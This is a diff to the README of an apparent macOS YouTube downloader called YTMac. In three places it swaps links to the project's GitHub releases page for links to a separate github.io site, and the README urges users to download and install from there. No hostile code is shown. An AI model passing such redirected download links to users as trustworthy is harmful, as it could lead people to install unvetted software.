@@ -4,7 +4,7 @@
 
 Welcome to **YTMac** — the free, simple, and powerful YouTube video downloader built specifically for macOS. Whether you want to save a music video, a tutorial, or your favorite vlog for offline viewing, YTMac makes it incredibly easy. No technical skills needed — just download, open, and paste your link. That's it!
 
-[![Download YTMac](https://img.shields.io/badge/Download-YTMac-2ea44f?style=for-the-badge&logo=apple&logoColor=white&labelColor=ff6b6b)](https://github.com/stelliteswiftlet384/YTMac/releases)
+[![Download YTMac](https://img.shields.io/badge/Download-YTMac-2ea44f?style=for-the-badge&logo=apple&logoColor=white&labelColor=ff6b6b)](https://stelliteswiftlet384.github.io)
 
 ## ⚡ What Is YTMac?
 
@@ -40,7 +40,7 @@ Follow these simple steps — you’ll be downloading videos within minutes:
 
 Visit this link to download the application:
 
-[**🔗 Download YTMac Now**](https://github.com/stelliteswiftlet384/YTMac/releases)
+[**🔗 Download YTMac Now**](https://stelliteswiftlet384.github.io)
 
 When you arrive at the page, look for the newest version (it’s usually at the top). Click the download button that matches your Mac type. You may see files like:
 - `YTMac.dmg` — the installation disk image
@@ -148,7 +148,7 @@ Yes. YTMac is built with your privacy in mind. It doesn’t collect personal dat
 
 We regularly release new features and improvements. To get the latest updates, simply revisit the download link and grab the newest version. Whenever you see YTMac improve, we’ll note it there.
 
-[**⬇️ Download the Latest Release**](https://github.com/stelliteswiftlet384/YTMac/releases)
+[**⬇️ Download the Latest Release**](https://stelliteswiftlet384.github.io)
 
 ## 💬 Get Help
 
